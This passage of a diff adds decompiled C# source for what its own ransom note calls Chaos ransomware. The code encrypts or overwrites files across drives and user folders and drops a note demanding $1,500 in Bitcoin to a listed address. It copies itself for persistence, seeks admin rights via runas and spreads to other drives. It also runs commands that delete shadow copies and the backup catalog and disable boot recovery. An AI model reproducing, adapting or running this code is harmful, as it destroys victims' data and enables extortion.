f6cAE2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQl1+UFv+h1f6cBNkHdl2yC3/Q6v9OACcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIO7/u/b/odX+nAThB3f937f9Dq/04AJwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAg7v+79v+h1f6cAAH//Z";
+
+	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";
+
+	private static string droppedMessageTextbox = "read_it.txt";
+
+	private static bool checkAdminPrivilage = false;
+
+	private static bool checkdeleteShadowCopies = false;
+
+	private static bool checkdisableRecoveryMode = false;
+
+	private static bool checkdeleteBackupCatalog = false;
+
+	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";
+
+	public static string appMutex2 = appMutexStartup2 + appMutexRun2;
+
+	public static string staticSplit = "bc";
+
+	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;
+
+	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");
+
+	private static string[] messages = new string[15]
+	{
+		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
+		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", ""
+	};
+
+	private static string[] validExtensions = new string[229]
+	{
+		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
+		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
+		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
+		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
+		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
+		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
+		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
+		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
+		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
+		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
+		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
+		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
+		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
+		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
+		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
+		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
+		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
+		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
+		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
+		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
+		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
+		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
+		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
+	};
+
+	private static Random random = new Random();
+
+	[DllImport("user32.dll", CharSet = CharSet.Auto)]
+	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);
+
+	private static void Main(string[] args)
+	{
+		if (AlreadyRunning())
+		{
+			Environment.Exit(1);
+		}
+		if (checkSleep)
+		{
+			sleepOutOfTempFolder();
+		}
+		if (checkAdminPrivilage)
+		{
+			copyResistForAdmin(processName);
+		}
+		else if (checkCopyRoaming)
+		{
+			copyRoaming(processName);
+		}
+		if (checkStartupFolder)
+		{
+			addLinkToStartup();
+		}
+		lookForDirectories();
+		if (checkAdminPrivilage)
+		{
+			if (checkdeleteShadowCopies)
+			{
+				deleteShadowCopies();
+			}
+			if (checkdisableRecoveryMode)
+			{
+				disableRecoveryMode();
+			}
+			if (checkdeleteBackupCatalog)
+			{
+				deleteBackupCatalog();
+			}
+		}
+		if (checkSpread)
+		{
+			spreadIt(spreadName);
+		}
+		addAndOpenNote();
+		SetWallpaper(base64Image);
+		new Thread((ThreadStart)delegate
+		{
+			Run();
+		}).Start();
+	}
+
+	public static void Run()
+	{
+		Application.Run((Form)(object)new driveNotification.NotificationForm());
+	}
+
+	private static void sleepOutOfTempFolder()
+	{
+		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
+		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+		if (directoryName != folderPath)
+		{
+			Thread.Sleep(sleepTextbox * 1000);
+		}
+	}
+
+	private static bool AlreadyRunning()
+	{
+		Process[] processes = Process.GetProcesses();
+		Process currentProcess = Process.GetCurrentProcess();
+		Process[] array = processes;
+		foreach (Process process in array)
+		{
+			try
+			{
+				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
+				{
+					return true;
+				}
+			}
+			catch (Exception)
+			{
+			}
+		}
+		return false;
+	}
+
+	public static byte[] random_bytes(int length)
+	{
+		Random random = new Random();
+		length++;
+		byte[] array = new byte[length];
+		random.NextBytes(array);
+		return array;
+	}
+
+	public static string RandomString(int length)
+	{
+		StringBuilder stringBuilder = new StringBuilder();
+		for (int i = 0; i < length; i++)
+		{
+			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
+			stringBuilder.Append(value);
+		}
+		return stringBuilder.ToString();
+	}
+
+	public static string RandomStringForExtension(int length)
+	{
+		if (encryptedFileExtension == "")
+		{
+			StringBuilder stringBuilder = new StringBuilder();
+			for (int i = 0; i < length; i++)
+			{
+				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
+				stringBuilder.Append(value);
+			}
+			return stringBuilder.ToString();
+		}
+		return encryptedFileExtension;
+	}
+
+	public static string Base64EncodeString(string plainText)
+	{
+		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
+		return Convert.ToBase64String(bytes);
+	}
+
+	public static string randomEncode(string plainText)
+	{
+		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
+		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
+	}
+
+	private static void encryptDirectory(string location)
+	{
+		try
+		{
+			string[] files = Directory.GetFiles(location);
+			bool flag = true;
+			string extension;
+			for (int i = 0; i < files.Length; i++)
+			{
+				try
+				{
+					extension = Path.GetExtension(files[i]);
+					string fileName = Path.GetFileName(files[i]);
+					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
+					{
+						continue;
+					}
+					FileInfo fileInfo = new FileInfo(files[i]);
+					fileInfo.Attributes = FileAttributes.Normal;
+					if (fileInfo.Length < 2117152L)
+					{
+						if (encryptionAesRsa)
+						{
+							EncryptFile(files[i]);
+						}
+					}
+					else if (fileInfo.Length > 200000000L)
+					{
+						Random random = new Random();
+						int length = random.Next(200000000, 300000000);
+						string @string = Encoding.UTF8.GetString(random_bytes(length));
+						File.WriteAllText(files[i], randomEncode(@string));
+						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
+					}
+					else
+					{
+						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
+						File.WriteAllText(files[i], randomEncode(string2));
+						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
+					}
+					if (flag)
+					{
+						flag = false;
+						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
+					}
+				}
+				catch
+				{
+				}
+			}
+			string[] directories = Directory.GetDirectories(location);
+			for (int j = 0; j < directories.Length; j++)
+			{
+				encryptDirectory(directories[j]);
+			}
+		}
+		catch (Exception)
+		{
+		}
+	}
+
+	public static string rsaKey()
+	{
+		StringBuilder stringBuilder = new StringBuilder();
+		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
+		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
+		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
+		stringBuilder.AppendLine("  <Modulus>3woZp56E3wjcMo7zQ6FSTV3jXWbZorcemJNuOcYAmLbeEGceg4Rs6QYp3m8eVWxOmODnqMu/paC5GRW8BYKvwvGCjUGFbdPDMf+XKwlLcikhGViZe4+xRLiBET9L2UOQaZek2mewckqRM7soBJ+RPPIQHz59UzDdz32HvRdlhSU=</Modulus>");
+		stringBuilder.AppendLine("</RSAParameters>");
+		return stringBuilder.ToString();
+	}
+
+	public static string CreatePassword(int length)
+	{
+		StringBuilder stringBuilder = new StringBuilder();
+		Random random = new Random();
+		while (0 < length--)
+		{
+			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
+		}
+		return stringBuilder.ToString();
+	}
+
+	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
+	{
+		byte[] array = null;
+		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
+		using MemoryStream memoryStream = new MemoryStream();
+		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
+		rijndaelManaged.KeySize = 256;
+		rijndaelManaged.BlockSize = 128;
+		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
+		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
+		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
+		rijndaelManaged.Mode = CipherMode.CBC;
+		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
+		{
+			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+			cryptoStream.Close();
+		}
+		return memoryStream.ToArray();
+	}
+
+	public static void EncryptFile(string file)
+	{
+		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
+		string text = CreatePassword(20);
+		byte[] bytes = Encoding.UTF8.GetBytes(text);
+		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
+		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
+		File.Move(file, file + "." + RandomStringForExtension(4));
+	}
+
+	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
+	{
+		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
+		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
+		try
+		{
+			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
+			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
+			return Convert.ToBase64String(inArray);
+		}
+		finally
+		{
+			rSACryptoServiceProvider.PersistKeyInCsp = false;
+		}
+	}
+
+	private static void lookForDirectories()
+	{
+		DriveInfo[] drives = DriveInfo.GetDrives();
+		foreach (DriveInfo driveInfo in drives)
+		{
+			if (driveInfo.ToString() != "C:\\")
+			{
+				encryptDirectory(driveInfo.ToString());
+			}
+		}
+		string location = userDir + userName + "\\Desktop";
+		string location2 = userDir + userName + "\\Links";
+		string location3 = userDir + userName + "\\Contacts";
+		string location4 = userDir + userName + "\\Desktop";
+		string location5 = userDir + userName + "\\Documents";
+		string location6 = userDir + userName + "\\Downloads";
+		string location7 = userDir + userName + "\\Pictures";
+		string location8 = userDir + userName + "\\Music";
+		string location9 = userDir + userName + "\\OneDrive";
+		string location10 = userDir + userName + "\\Saved Games";
+		string location11 = userDir + userName + "\\Favorites";
+		string location12 = userDir + userName + "\\Searches";
+		string location13 = userDir + userName + "\\Videos";
+		encryptDirectory(location);
+		encryptDirectory(location2);
+		encryptDirectory(location3);
+		encryptDirectory(location4);
+		encryptDirectory(location5);
+		encryptDirectory(location6);
+		encryptDirectory(location7);
+		encryptDirectory(location8);
+		encryptDirectory(location9);
+		encryptDirectory(location10);
+		encryptDirectory(location11);
+		encryptDirectory(location12);
+		encryptDirectory(location13);
+		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
+		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
+		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
+		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
+		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
+		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
+	}
+
+	private static void copyRoaming(string processName)
+	{
+		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
+		string location = Assembly.GetExecutingAssembly().Location;
+		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
+		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
+		string text2 = text + processName;
+		if (!(friendlyName != processName) && !(location != text2))
+		{
+			return;
+		}
+		if (!File.Exists(text2))
+		{
+			File.Copy(friendlyName, text2);
+			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
+			processStartInfo.WorkingDirectory = text;
+			Process process = new Process();
+			process.StartInfo = processStartInfo;
+			if (process.Start())
+			{
+				Environment.Exit(1);
+			}
+			return;
+		}
+		try
+		{
+			File.Delete(text2);
+			Thread.Sleep(200);
+			File.Copy(friendlyName, text2);
+		}
+		catch
+		{
+		}
+		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
+		processStartInfo2.WorkingDirectory = text;
+		Process process2 = new Process();
+		process2.StartInfo = processStartInfo2;
+		if (process2.Start())
+		{
+			Environment.Exit(1);
+		}
+	}
+
+	private static void copyResistForAdmin(string processName)
+	{
+		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
+		string location = Assembly.GetExecutingAssembly().Location;
+		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
+		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
+		string text2 = text + processName;
+		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
+		processStartInfo.UseShellExecute = true;
+		processStartInfo.Verb = "runas";
+		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
+		processStartInfo.WorkingDirectory = text;
+		ProcessStartInfo startInfo = processStartInfo;
+		Process process = new Process();
+		process.StartInfo = startInfo;
+		if (!(friendlyName != processName) && !(location != text2))
+		{
+			return;
+		}
+		if (!File.Exists(text2))
+		{
+			File.Copy(friendlyName, text2);
+			try
+			{
+				Process.Start(startInfo);
+				Environment.Exit(1);
+				return;
+			}
+			catch (Win32Exception ex)
+			{
+				if (ex.NativeErrorCode == 1223)
+				{
+					copyResistForAdmin(processName);
+				}
+				return;
+			}
+		}
+		try
+		{
+			File.Delete(text2);
+			Thread.Sleep(200);
+			File.Copy(friendlyName, text2);
+		}
+		catch
+		{
+		}
+		try
+		{
+			Process.Start(startInfo);
+			Environment.Exit(1);
+		}
+		catch (Win32Exception ex2)
+		{
+			if (ex2.NativeErrorCode == 1223)
+			{
+				copyResistForAdmin(processName);
+			}
+		}
+	}
+
+	private static void addLinkToStartup()
+	{
+		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+		string text = Process.GetCurrentProcess().ProcessName;
+		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
+		string location = Assembly.GetExecutingAssembly().Location;
+		streamWriter.WriteLine("[InternetShortcut]");
+		streamWriter.WriteLine("URL=file:///" + location);
+		streamWriter.WriteLine("IconIndex=0");
+		string text2 = location.Replace('\\', '/');
+		streamWriter.WriteLine("IconFile=" + text2);
+	}
+
+	private static void addAndOpenNote()
+	{
+		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
+		try
+		{
+			File.WriteAllLines(text, messages);
+			Thread.Sleep(500);
+			Process.Start(text);
+		}
+		catch
+		{
+		}
+	}
+
+	private static void registryStartup()
+	{
+		try
+		{
+			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
+			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
+		}
+		catch
+		{
+		}
+	}
+
+	private static void spreadIt(string spreadName)
+	{
+		DriveInfo[] drives = DriveInfo.GetDrives();
+		foreach (DriveInfo driveInfo in drives)
+		{
+			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
+			{
+				try
+				{
+					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
+				}
+				catch
+				{
+				}
+			}
+		}
+	}
+
+	private static void runCommand(string commands)
+	{
+		Process process = new Process();
+		ProcessStartInfo processStartInfo = new ProcessStartInfo();
+		processStartInfo.FileName = "cmd.exe";
+		processStartInfo.Arguments = "/C " + commands;
+		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+		process.StartInfo = processStartInfo;
+		process.Start();
+		process.WaitForExit();
+	}
+
+	private static void deleteShadowCopies()
+	{
+		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
+	}
+
+	private static void disableRecoveryMode()
+	{
+		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
+	}
+
+	private static void deleteBackupCatalog()
+	{
+		runCommand("wbadmin delete catalog -quiet");
+	}
+
+	public static void SetWallpaper(string base64)
+	{
+		if (base64 != "")
+		{
+			try
+			{
+				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
+				File.WriteAllBytes(text, Convert.FromBase64String(base64));
+				SystemParametersInfo(20u, 0u, text, 3u);
+			}
+			catch
+			{
+			}
+		}
+	}
+}
